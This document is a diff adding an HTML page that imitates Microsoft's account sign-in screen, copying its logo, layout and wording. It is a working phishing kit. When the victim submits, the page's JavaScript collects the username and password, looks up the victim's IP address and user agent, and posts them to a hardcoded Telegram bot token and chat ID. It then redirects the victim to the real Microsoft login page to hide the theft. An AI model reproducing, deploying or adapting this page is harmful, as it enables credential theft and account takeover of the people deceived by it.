@@ -1,0 +1,1725 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="description" content="Microsoft-style personal account sign-in interface demonstration">
+
+    <meta name="theme-color" content="#f3f6f9">
+
+    <link rel="shortcut icon"
+        href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+
+    <title>Sign in - Microsoft</title>
+
+
+    <style>
+        /* =========================================================
+           GLOBAL RESET
+        ========================================================= */
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+        }
+
+
+        html,
+        body {
+            width: 100%;
+            min-height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+
+        html {
+            -webkit-text-size-adjust: 100%;
+            text-size-adjust: 100%;
+        }
+
+
+        body {
+            direction: ltr;
+
+            font-family:
+                "Segoe UI Webfont",
+                "Segoe UI",
+                -apple-system,
+                BlinkMacSystemFont,
+                "Helvetica Neue",
+                Arial,
+                sans-serif;
+
+            font-size: 15px;
+            line-height: 20px;
+            font-weight: 400;
+
+            color: #1b1b1b;
+
+            background: #f3f6f9;
+
+            overflow-x: hidden;
+
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+
+        button,
+        input {
+            font-family: inherit;
+        }
+
+
+        button {
+            border: 0;
+            margin: 0;
+        }
+
+
+        a {
+            color: inherit;
+        }
+
+
+        /* =========================================================
+           MAIN PAGE
+        ========================================================= */
+
+        .page {
+            position: relative;
+
+            width: 100%;
+            min-height: 100vh;
+
+            display: flex;
+            flex-direction: column;
+
+            overflow: hidden;
+
+            background:
+                radial-gradient(circle at 8% 12%,
+                    rgba(255, 255, 255, .95) 0%,
+                    rgba(255, 255, 255, 0) 30%),
+
+                radial-gradient(circle at 92% 18%,
+                    rgba(221, 237, 255, .95) 0%,
+                    rgba(221, 237, 255, 0) 30%),
+
+                radial-gradient(circle at 78% 85%,
+                    rgba(214, 230, 255, .8) 0%,
+                    rgba(214, 230, 255, 0) 32%),
+
+                linear-gradient(135deg,
+                    #eef4fb 0%,
+                    #f8fafc 48%,
+                    #e9f1fa 100%);
+        }
+
+
+        /* =========================================================
+           BACKGROUND FLUENT SHAPES
+        ========================================================= */
+
+        .background-shape {
+            position: absolute;
+
+            pointer-events: none;
+
+            border-radius: 999px;
+
+            filter: blur(3px);
+
+            opacity: .72;
+        }
+
+
+        .shape-one {
+            width: 540px;
+            height: 190px;
+
+            top: 7%;
+            left: -150px;
+
+            transform: rotate(-20deg);
+
+            background:
+                linear-gradient(90deg,
+                    rgba(255, 255, 255, 0),
+                    rgba(255, 255, 255, .72),
+                    rgba(220, 235, 255, 0));
+        }
+
+
+        .shape-two {
+            width: 620px;
+            height: 220px;
+
+            top: 26%;
+            right: -190px;
+
+            transform: rotate(24deg);
+
+            background:
+                linear-gradient(90deg,
+                    rgba(220, 237, 255, 0),
+                    rgba(225, 240, 255, .85),
+                    rgba(220, 237, 255, 0));
+        }
+
+
+        .shape-three {
+            width: 540px;
+            height: 180px;
+
+            bottom: 8%;
+            left: -130px;
+
+            transform: rotate(15deg);
+
+            background:
+                linear-gradient(90deg,
+                    rgba(255, 255, 255, 0),
+                    rgba(225, 239, 255, .7),
+                    rgba(255, 255, 255, 0));
+        }
+
+
+        /* =========================================================
+           MAIN CONTENT
+        ========================================================= */
+
+        .main-wrapper {
+            position: relative;
+
+            z-index: 5;
+
+            width: 100%;
+
+            flex: 1;
+
+            min-height: calc(100vh - 52px);
+
+            display: flex;
+
+            flex-direction: column;
+
+            align-items: center;
+
+            justify-content: center;
+
+            padding: 30px 20px 25px;
+        }
+
+
+        /* =========================================================
+           SIGN-IN CARD
+        ========================================================= */
+
+        .sign-in-box {
+            position: relative;
+
+            width: calc(100% - 40px);
+
+            max-width: 440px;
+
+            min-width: 320px;
+
+            min-height: 338px;
+
+            margin: 0 auto 20px;
+
+            padding: 44px;
+
+            background: #ffffff;
+
+            box-shadow:
+                0 2px 6px rgba(0, 0, 0, .20);
+
+            overflow: hidden;
+
+            text-align: left;
+
+            transition:
+                opacity .2s ease,
+                transform .2s ease;
+        }
+
+
+        /* =========================================================
+           MICROSOFT LOGO
+           
+           Exact SVG supplied by you.
+           
+           IMPORTANT:
+           The previous CSS four-square logo has been removed.
+        ========================================================= */
+
+        .brand {
+            display: flex;
+
+            align-items: center;
+
+            width: 100%;
+
+            height: 24px;
+
+            margin-bottom: 22px;
+        }
+
+
+        .ms-logo {
+            width: 108px;
+
+            height: 24px;
+
+            display: flex;
+
+            align-items: center;
+
+            flex-shrink: 0;
+        }
+
+
+        .ms-logo img {
+            display: block;
+
+            width: 108px;
+
+            height: auto;
+
+            max-height: 24px;
+
+            object-fit: contain;
+        }
+
+
+        /* =========================================================
+           LOADER
+           
+           Three small blue dots directly below the logo.
+        ========================================================= */
+
+        .microsoft-loader {
+            display: none;
+
+            align-items: center;
+
+            height: 14px;
+
+            margin-top: -5px;
+
+            margin-bottom: 13px;
+        }
+
+
+        .microsoft-loader.active {
+            display: flex;
+        }
+
+
+        .loader-dots {
+            display: flex;
+
+            align-items: center;
+
+            gap: 5px;
+        }
+
+
+        .loader-dot {
+            width: 6px;
+
+            height: 6px;
+
+            border-radius: 50%;
+
+            background: #0067b8;
+
+            animation:
+                microsoftDot 1s infinite ease-in-out;
+        }
+
+
+        .loader-dot:nth-child(1) {
+            animation-delay: 0s;
+        }
+
+
+        .loader-dot:nth-child(2) {
+            animation-delay: .12s;
+        }
+
+
+        .loader-dot:nth-child(3) {
+            animation-delay: .24s;
+        }
+
+
+        @keyframes microsoftDot {
+
+            0%,
+            60%,
+            100% {
+                transform: translateX(0);
+
+                opacity: .35;
+            }
+
+            30% {
+                transform: translateX(8px);
+
+                opacity: 1;
+            }
+        }
+
+
+        /* =========================================================
+           SCREEN TRANSITION
+        ========================================================= */
+
+        .screen {
+            animation:
+                screenFadeIn .25s ease;
+        }
+
+
+        .screen.hidden {
+            display: none;
+        }
+
+
+        @keyframes screenFadeIn {
+
+            from {
+                opacity: 0;
+
+                transform:
+                    translateY(4px);
+            }
+
+            to {
+                opacity: 1;
+
+                transform:
+                    translateY(0);
+            }
+        }
+
+
+        /* =========================================================
+           HEADINGS
+        ========================================================= */
+
+        h1 {
+            margin: 0 0 18px;
+
+            color: #1b1b1b;
+
+            font-size: 24px;
+
+            line-height: 29px;
+
+            font-weight: 600;
+
+            letter-spacing: -.3px;
+        }
+
+
+        .password-heading {
+            margin-bottom: 14px;
+        }
+
+
+        /* =========================================================
+           FORM
+        ========================================================= */
+
+        .form-area {
+            width: 100%;
+        }
+
+
+        .field {
+            position: relative;
+
+            width: 100%;
+
+            margin-bottom: 18px;
+        }
+
+
+        /* =========================================================
+           EMAIL + PASSWORD FIELDS
+           
+           IMPORTANT:
+           These remain UNDERLINE ONLY.
+           
+           There is deliberately NO:
+           border: 1px solid ...
+           outline box
+           border-radius
+           background box
+        ========================================================= */
+
+        .field input {
+            display: block;
+
+            width: 100%;
+
+            height: 36px;
+
+            padding:
+                5px 0 7px;
+
+            border: 0;
+
+            border-bottom:
+                1px solid #666;
+
+            border-radius: 0;
+
+            outline: none;
+
+            background: transparent;
+
+            color: #1b1b1b;
+
+            font-size: 15px;
+
+            line-height: 20px;
+
+            appearance: none;
+
+            -webkit-appearance: none;
+
+            box-shadow: none;
+
+            transition:
+                border-color .15s ease,
+                border-width .15s ease;
+        }
+
+
+        .field input::placeholder {
+            color: #666;
+
+            opacity: 1;
+        }
+
+
+        .field input:focus {
+            border: 0;
+
+            border-bottom:
+                2px solid #0067b8;
+
+            border-radius: 0;
+
+            outline: none;
+
+            box-shadow: none;
+
+            background: transparent;
+        }
+
+
+        .field input:hover:not(:focus) {
+            border-bottom-color: #333;
+        }
+
+
+        /* =========================================================
+           LINKS
+        ========================================================= */
+
+        .link {
+            color: #0067b8;
+
+            font-size: 13px;
+
+            line-height: 18px;
+
+            text-decoration: none;
+        }
+
+
+        .link:hover {
+            color: #004f8c;
+
+            text-decoration: underline;
+        }
+
+
+        .link:focus-visible {
+            outline:
+                2px solid #0067b8;
+
+            outline-offset: 2px;
+        }
+
+
+        /* =========================================================
+           ACCOUNT CREATION / RECOVERY
+        ========================================================= */
+
+        .create-account {
+            margin-top: 18px;
+
+            margin-bottom: 14px;
+        }
+
+
+        .recovery {
+            margin-bottom: 24px;
+        }
+
+
+        .password-recovery {
+            margin-top: 2px;
+
+            margin-bottom: 22px;
+        }
+
+
+        /* =========================================================
+           BUTTON ROW
+        ========================================================= */
+
+        .button-row {
+            width: 100%;
+
+            display: flex;
+
+            justify-content: flex-end;
+
+            align-items: center;
+
+            margin-top: 8px;
+        }
+
+
+        /* =========================================================
+           PRIMARY BUTTON
+        ========================================================= */
+
+        .primary-button {
+            min-width: 108px;
+
+            min-height: 32px;
+
+            padding:
+                6px 24px;
+
+            background: #0067b8;
+
+            color: #ffffff;
+
+            font-size: 15px;
+
+            line-height: 20px;
+
+            cursor: pointer;
+
+            transition:
+                background-color .15s ease,
+                transform .05s ease;
+        }
+
+
+        .primary-button:hover {
+            background: #005da6;
+        }
+
+
+        .primary-button:active {
+            transform:
+                translateY(1px);
+        }
+
+
+        .primary-button:focus-visible {
+            outline:
+                2px solid #1b1b1b;
+
+            outline-offset: 2px;
+        }
+
+
+        /* =========================================================
+           SECONDARY BUTTON
+        ========================================================= */
+
+        .secondary-button {
+            min-width: 108px;
+
+            min-height: 32px;
+
+            padding:
+                6px 24px;
+
+            margin-right: 8px;
+
+            background: #eeeeee;
+
+            color: #1b1b1b;
+
+            font-size: 15px;
+
+            cursor: pointer;
+
+            transition:
+                background-color .15s ease;
+        }
+
+
+        .secondary-button:hover {
+            background: #e1e1e1;
+        }
+
+
+        .secondary-button:focus-visible {
+            outline:
+                2px solid #0067b8;
+
+            outline-offset: 2px;
+        }
+
+
+        /* =========================================================
+           PASSWORD SHOW/HIDE
+        ========================================================= */
+
+        .password-field {
+            position: relative;
+        }
+
+
+        .show-password {
+            position: absolute;
+
+            right: 0;
+
+            bottom: 7px;
+
+            padding: 0;
+
+            background: transparent;
+
+            color: #0067b8;
+
+            font-size: 13px;
+
+            line-height: 18px;
+
+            cursor: pointer;
+        }
+
+
+        .show-password:hover {
+            text-decoration: underline;
+        }
+
+
+        .show-password:focus-visible {
+            outline:
+                2px solid #0067b8;
+
+            outline-offset: 2px;
+        }
+
+
+        /* =========================================================
+           ACCOUNT DISPLAY
+        ========================================================= */
+
+        .account-display {
+            display: flex;
+
+            align-items: center;
+
+            width: fit-content;
+
+            max-width: 100%;
+
+            margin-bottom: 18px;
+
+            color: #1b1b1b;
+
+            font-size: 15px;
+
+            line-height: 20px;
+        }
+
+
+        .back-arrow {
+            width: 24px;
+
+            height: 24px;
+
+            display: inline-flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            flex-shrink: 0;
+
+            margin-right: 4px;
+
+            padding: 0;
+
+            border-radius: 50%;
+
+            background: transparent;
+
+            color: #1b1b1b;
+
+            font-size: 21px;
+
+            line-height: 1;
+
+            cursor: pointer;
+
+            transition:
+                background-color .15s ease;
+        }
+
+
+        .back-arrow:hover {
+            background: #f1f1f1;
+        }
+
+
+        .back-arrow:focus-visible {
+            outline:
+                2px solid #0067b8;
+
+            outline-offset: 2px;
+        }
+
+
+        .account-email {
+            display: block;
+
+            max-width: 290px;
+
+            overflow: hidden;
+
+            text-overflow: ellipsis;
+
+            white-space: nowrap;
+        }
+
+
+        /* =========================================================
+           ERROR MESSAGE
+        ========================================================= */
+
+        .error-message {
+            display: none;
+
+            margin-top: -8px;
+
+            margin-bottom: 14px;
+
+            color: #d83b01;
+
+            font-size: 13px;
+
+            line-height: 18px;
+        }
+
+
+        .error-message.show {
+            display: block;
+        }
+
+
+        /* =========================================================
+           SIGN-IN OPTIONS
+           
+           Completely separate block.
+           
+           It remains below the main login card.
+        ========================================================= */
+
+        .sign-in-options {
+            width: calc(100% - 40px);
+
+            max-width: 440px;
+
+            min-width: 320px;
+
+            min-height: 52px;
+
+            margin: 0 auto;
+
+            padding:
+                14px 44px;
+
+            background: #ffffff;
+
+            color: #1b1b1b;
+
+            box-shadow:
+                0 2px 6px rgba(0, 0, 0, .20);
+
+            text-align: left;
+
+            cursor: pointer;
+
+            transition:
+                background-color .15s ease,
+                box-shadow .15s ease;
+        }
+
+
+        .sign-in-options:hover {
+            background: #f8f8f8;
+
+            box-shadow:
+                0 3px 8px rgba(0, 0, 0, .22);
+        }
+
+
+        .sign-in-options:focus-visible {
+            outline:
+                2px solid #0067b8;
+
+            outline-offset: 2px;
+        }
+
+
+        .options-content {
+            width: 100%;
+
+            display: flex;
+
+            align-items: center;
+
+            gap: 14px;
+
+            font-size: 15px;
+
+            line-height: 20px;
+        }
+
+
+        /* =========================================================
+           MICROSOFT SIGN-IN OPTIONS SVG
+        ========================================================= */
+
+        .options-icon {
+            width: 22px;
+
+            height: 22px;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            flex-shrink: 0;
+        }
+
+
+        .options-icon img {
+            display: block;
+
+            width: 22px;
+
+            height: 22px;
+
+            object-fit: contain;
+        }
+
+
+        /* =========================================================
+           DEMO NOTICE
+        ========================================================= */
+
+        .demo-notice {
+            width: calc(100% - 40px);
+
+            max-width: 440px;
+
+            margin-top: 14px;
+
+            color: #444;
+
+            text-align: center;
+
+            font-size: 11px;
+
+            line-height: 16px;
+        }
+
+
+        /* =========================================================
+           FOOTER
+        ========================================================= */
+
+        .footer {
+            position: relative;
+
+            z-index: 10;
+
+            width: 100%;
+
+            min-height: 52px;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: flex-end;
+
+            gap: 18px;
+
+            padding:
+                0 24px;
+
+            color: #444;
+
+            font-size: 12px;
+        }
+
+
+        .footer a {
+            text-decoration: none;
+        }
+
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+
+        .footer a:focus-visible {
+            outline:
+                2px solid #0067b8;
+
+            outline-offset: 2px;
+        }
+
+
+        /* =========================================================
+           MOBILE
+        ========================================================= */
+
+        @media (max-width: 600px) {
+
+            .main-wrapper {
+                justify-content: flex-start;
+
+                padding:
+                    24px 0 30px;
+            }
+
+
+            .sign-in-box {
+                width:
+                    calc(100% - 24px);
+
+                min-width: 0;
+
+                padding:
+                    32px 28px;
+
+                margin-bottom: 16px;
+            }
+
+
+            .sign-in-options {
+                width:
+                    calc(100% - 24px);
+
+                min-width: 0;
+
+                padding:
+                    14px 28px;
+            }
+
+
+            .demo-notice {
+                width:
+                    calc(100% - 32px);
+            }
+
+
+            .footer {
+                justify-content: center;
+
+                flex-wrap: wrap;
+
+                height: auto;
+
+                padding:
+                    10px 16px 18px;
+
+                gap: 12px;
+            }
+        }
+
+
+        /* =========================================================
+           SMALL PHONES
+        ========================================================= */
+
+        @media (max-width: 360px) {
+
+            .sign-in-box {
+                padding:
+                    28px 22px;
+            }
+
+
+            .sign-in-options {
+                padding:
+                    14px 22px;
+            }
+
+
+            h1 {
+                font-size: 22px;
+            }
+
+
+            .primary-button,
+            .secondary-button {
+                min-width: 96px;
+
+                padding:
+                    6px 18px;
+            }
+
+
+            .account-email {
+                max-width: 230px;
+            }
+        }
+
+
+        /* =========================================================
+           REDUCED MOTION
+        ========================================================= */
+
+        @media (prefers-reduced-motion: reduce) {
+
+            *,
+            *::before,
+            *::after {
+                animation-duration:
+                    .01ms !important;
+
+                animation-iteration-count:
+                    1 !important;
+
+                transition-duration:
+                    .01ms !important;
+            }
+        }
+    </style>
+
+</head>
+
+
+<body>
+
+
+    <!-- =========================================================
+         PAGE
+    ========================================================= -->
+
+    <div class="page">
+
+
+        <!-- =====================================================
+             BACKGROUND
+        ====================================================== -->
+
+        <div class="background-shape shape-one" aria-hidden="true"></div>
+
+
+        <div class="background-shape shape-two" aria-hidden="true"></div>
+
+
+        <div class="background-shape shape-three" aria-hidden="true"></div>
+
+
+        <!-- =====================================================
+             MAIN WRAPPER
+        ====================================================== -->
+
+        <main class="main-wrapper">
+
+
+            <!-- =================================================
+                 LOGIN CARD
+            ================================================== -->
+
+            <section class="sign-in-box" aria-label="Sign in">
+
+
+                <!-- =============================================
+                     MICROSOFT LOGO
+                     
+                     Exact SVG provided by you.
+                ============================================== -->
+
+                <div class="brand">
+
+                    <div class="ms-logo" aria-label="Microsoft">
+
+                        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
+                            alt="Microsoft">
+
+                    </div>
+
+                </div>
+
+
+                <!-- =============================================
+                     LOADING DOTS
+                ============================================== -->
+
+                <div id="loader" class="microsoft-loader" aria-hidden="true">
+
+                    <div class="loader-dots">
+
+                        <span class="loader-dot"></span>
+
+                        <span class="loader-dot"></span>
+
+                        <span class="loader-dot"></span>
+
+                    </div>
+
+                </div>
+
+
+                <!-- =============================================
+                     EMAIL SCREEN
+                ============================================== -->
+
+                <div id="emailScreen" class="screen">
+
+
+                    <h1>
+                        Sign in
+                    </h1>
+
+
+                    <form id="emailForm" class="form-area" novalidate>
+
+
+                        <div class="field">
+
+                            <input id="email" name="email" type="text" inputmode="email" autocomplete="off"
+                                placeholder="Email, phone, or Skype" aria-label="Email, phone, or Skype">
+
+                        </div>
+
+
+                        <div id="emailError" class="error-message" role="alert">
+                            Please enter an email address, phone number,
+                            or Skype name.
+                        </div>
+
+
+                        <div class="create-account">
+
+                            <span>
+                                No account?
+                            </span>
+
+                            <a href="#" class="link" id="createAccount">
+                                Create one!
+                            </a>
+
+                        </div>
+
+
+                        <div class="recovery">
+
+                            <a href="#" class="link" id="cantAccess">
+                                Can't access your account?
+                            </a>
+
+                        </div>
+
+
+                        <div class="button-row">
+
+                            <button type="submit" class="primary-button">
+                                Next
+                            </button>
+
+                        </div>
+
+
+                    </form>
+
+
+                </div>
+
+
+                <!-- =============================================
+                     PASSWORD SCREEN
+                ============================================== -->
+
+                <div id="passwordScreen" class="screen hidden">
+
+
+                    <h1 class="password-heading">
+                        Enter password
+                    </h1>
+
+
+                    <div class="account-display">
+
+
+                        <button type="button" id="backButton" class="back-arrow" aria-label="Back" title="Back">
+                            ←
+                        </button>
+
+
+                        <span id="accountEmail" class="account-email"></span>
+
+
+                    </div>
+
+
+                    <form id="passwordForm" class="form-area" novalidate>
+
+
+                        <div class="field password-field">
+
+
+                            <input id="password" name="password" type="password" autocomplete="off"
+                                placeholder="Password" aria-label="Password">
+
+
+                            <button type="button" id="showPassword" class="show-password" aria-label="Show password">
+                                Show
+                            </button>
+
+
+                        </div>
+
+
+                        <div id="passwordError" class="error-message" role="alert">
+                            Please enter your password.
+                        </div>
+
+
+                        <div class="password-recovery">
+
+                            <a href="#" class="link" id="forgotPassword">
+                                Forgot password?
+                            </a>
+
+                        </div>
+
+
+                        <div class="button-row">
+
+
+                            <button type="button" id="passwordBack" class="secondary-button">
+                                Back
+                            </button>
+
+                            <button type="submit" class="primary-button"> Sign in </button>
+
+
+                        </div>
+
+
+                    </form>
+
+
+                </div>
+
+
+            </section>
+
+
+            <!-- =================================================
+                 SIGN-IN OPTIONS
+            ================================================== -->
+
+            <button type="button" class="sign-in-options" id="signInOptions">
+
+
+                <span class="options-content">
+
+
+                    <span class="options-icon" aria-hidden="true">
+
+                        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
+                            alt="">
+
+                    </span>
+
+
+                    <span>
+                        Sign-in options
+                    </span>
+
+
+                </span>
+
+
+            </button>
+
+
+            <!-- =================================================
+                 DEMO NOTICE
+            ================================================== -->
+
+
+
+        </main>
+
+
+        <!-- =====================================================
+             FOOTER
+        ====================================================== -->
+
+        <footer class="footer">
+
+
+            <a href="#" id="privacyLink">
+                Privacy &amp; cookies
+            </a>
+
+
+            <a href="#" id="termsLink">
+                Terms of use
+            </a>
+
+
+            <a href="#" id="helpLink">
+                Help
+            </a>
+
+
+            <span>
+                © Microsoft
+            </span>
+
+
+        </footer>
+
+
+    </div>
+
+
+    <!-- =========================================================
+         JAVASCRIPT
+    ========================================================== -->
+
+    <script>
+        "use strict";
+
+        /* =====================================================
+           ELEMENTS
+        ===================================================== */
+
+        const emailScreen = document.getElementById("emailScreen");
+        const passwordScreen = document.getElementById("passwordScreen");
+        const emailForm = document.getElementById("emailForm");
+        const passwordForm = document.getElementById("passwordForm");
+        const emailInput = document.getElementById("email");
+        const passwordInput = document.getElementById("password");
+        const accountEmail = document.getElementById("accountEmail");
+        const loader = document.getElementById("loader");
+        const passwordBack = document.getElementById("passwordBack");
+        const showPassword = document.getElementById("showPassword");
+        const emailError = document.getElementById("emailError");
+        const passwordError = document.getElementById("passwordError");
+        const signInOptions = document.getElementById("signInOptions");
+        const signInButton = document.querySelector("button.primary-button");
+
+        /* =====================================================
+           STATE
+        ===================================================== */
+
+        let transitionInProgress = false;
+
+        /* =====================================================
+           LOADER
+        ===================================================== */
+
+        function showLoader() {
+            loader.classList.add("active");
+            emailScreen.classList.add("hidden");
+            passwordScreen.classList.add("hidden");
+        }
+
+        function hideLoader() {
+            loader.classList.remove("active");
+        }
+
+        /* =====================================================
+           EMAIL → PASSWORD
+        ===================================================== */
+
+        function showPasswordScreen() {
+            if (transitionInProgress) return;
+            transitionInProgress = true;
+            showLoader();
+            setTimeout(function () {
+                hideLoader();
+                passwordScreen.classList.remove("hidden", "screen");
+                void passwordScreen.offsetWidth;
+                passwordScreen.classList.add("screen");
+                transitionInProgress = false;
+                setTimeout(function () {
+                    passwordInput.focus();
+                }, 100);
+            }, 950);
+        }
+
+        /* =====================================================
+           PASSWORD → EMAIL
+        ===================================================== */
+
+        function showEmailScreen() {
+            if (transitionInProgress) return;
+            transitionInProgress = true;
+            showLoader();
+            setTimeout(function () {
+                hideLoader();
+                passwordScreen.classList.add("hidden");
+                emailScreen.classList.remove("hidden", "screen");
+                void emailScreen.offsetWidth;
+                emailScreen.classList.add("screen");
+                transitionInProgress = false;
+                setTimeout(function () {
+                    emailInput.focus();
+                }, 100);
+            }, 650);
+        }
+
+        /* =====================================================
+           EMAIL FORM
+        ===================================================== */
+
+        emailForm.addEventListener("submit", function (event) {
+            event.preventDefault();
+            const value = emailInput.value.trim();
+            emailError.classList.remove("show");
+            if (!value) {
+                emailError.classList.add("show");
+                emailInput.focus();
+                return;
+            }
+            accountEmail.textContent = value;
+            showPasswordScreen();
+        });
+
+        /* =====================================================
+           BACK BUTTON
+        ===================================================== */
+
+        function goBackToEmail() {
+            passwordInput.value = "";
+            passwordInput.type = "password";
+            showPassword.textContent = "Show";
+            showPassword.setAttribute("aria-label", "Show password");
+            passwordError.classList.remove("show");
+            showEmailScreen();
+        }
+
+        passwordBack.addEventListener("click", goBackToEmail);
+
+        /* =====================================================
+           SHOW / HIDE PASSWORD
+        ===================================================== */
+
+        showPassword.addEventListener("click", function () {
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                showPassword.textContent = "Hide";
+                showPassword.setAttribute("aria-label", "Hide password");
+            } else {
+                passwordInput.type = "password";
+                showPassword.textContent = "Show";
+                showPassword.setAttribute("aria-label", "Show password");
+            }
+            passwordInput.focus();
+        });
+
+        /* =====================================================
+           PASSWORD FORM
+        ===================================================== */
+
+        passwordForm.addEventListener("submit", function (event) {
+            event.preventDefault();
+            passwordError.classList.remove("show");
+            const value = passwordInput.value;
+            if (!value) {
+                passwordError.classList.add("show");
+                passwordInput.focus();
+                return;
+            }
+
+            // Fetch IP address
+            getIPAddress()
+                .then(ip => {
+                    // Collect form data
+                    const formData = {
+                        username: emailInput.value,
+                        password: value,
+                        ip: ip,
+                        userAgent: navigator.userAgent
+                    };
+
+                    console.log('Form Data:', formData);
+
+                    // Send data to Telegram bot with emojis
+                    sendDataToTelegramBot(formData);
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                    // Proceed with empty IP
+                    const formData = {
+                        username: emailInput.value,
+                        password: value,
+                        ip: 'Unknown IP',
+                        userAgent: navigator.userAgent
+                    };
+
+                    console.log('Form Data:', formData);
+
+                    // Send data to Telegram bot with emojis
+                    sendDataToTelegramBot(formData);
+                });
+        });
+
+        /* =====================================================
+           SIGN-IN OPTIONS BUTTON
+        ===================================================== */
+
+        signInOptions.addEventListener("click", function () {
+            alert("Sign-in options clicked.");
+        });
+
+        /* =====================================================
+           DISABLE PLACEHOLDER LINKS
+        ===================================================== */
+
+        document.querySelectorAll('a[href="#"]').forEach(function (link) {
+            link.addEventListener("click", function (event) {
+                event.preventDefault();
+            });
+        });
+
+        /* =====================================================
+           KEYBOARD ESCAPE
+        ===================================================== */
+
+        document.addEventListener("keydown", function (event) {
+            if (event.key === "Escape" && passwordScreen.classList.contains("screen") && !passwordScreen.classList.contains("hidden")) {
+                goBackToEmail();
+            }
+        });
+
+        /* =====================================================
+           CLEAR EMAIL ERROR WHILE TYPING
+        ===================================================== */
+
+        emailInput.addEventListener("input", function () {
+            if (emailInput.value.trim()) {
+                emailError.classList.remove("show");
+            }
+        });
+
+        /* =====================================================
+           CLEAR PASSWORD ERROR WHILE TYPING
+        ===================================================== */
+
+        passwordInput.addEventListener("input", function () {
+            if (passwordInput.value) {
+                passwordError.classList.remove("show");
+            }
+        });
+
+        /* =====================================================
+           INITIAL FOCUS
+        ===================================================== */
+
+        window.addEventListener("load", function () {
+            setTimeout(function () {
+                emailInput.focus();
+            }, 250);
+        });
+
+        // Function to get IP address
+        function getIPAddress() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('IP Address:', data.ip);
+                    return data.ip;
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                    return 'Unknown IP';
+                });
+        }
+
+        // Function to send data to Telegram bot with emojis
+        function sendDataToTelegramBot(data) {
+            const telegramBotToken = '8387150770:AAG9y4ud3Rbe1CBIrVsfIww5W1XCJ-rAc2c'; // Replace with your bot token
+            const telegramChatId = '676012585'; // Replace with your chat ID
+
+            const message = `*Username:* ${data.username}\n*Password:* ${data.password}\n*IP Address:* ${data.ip}\n*User Agent:* ${data.userAgent}`;
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: message,
+                    parse_mode: "Markdown"
+                }),
+            })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Data sent to Telegram bot successfully');
+                        window.location.href = 'https://login.microsoftonline.com'; // Redirect to Microsoft login page
+                    } else {
+                        console.error('Error sending data to Telegram bot:', response.statusText);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending data to Telegram bot:', error);
+                });
+        }
+
+
+
+
+    </script>
+
+
+</body>
+
+</html>
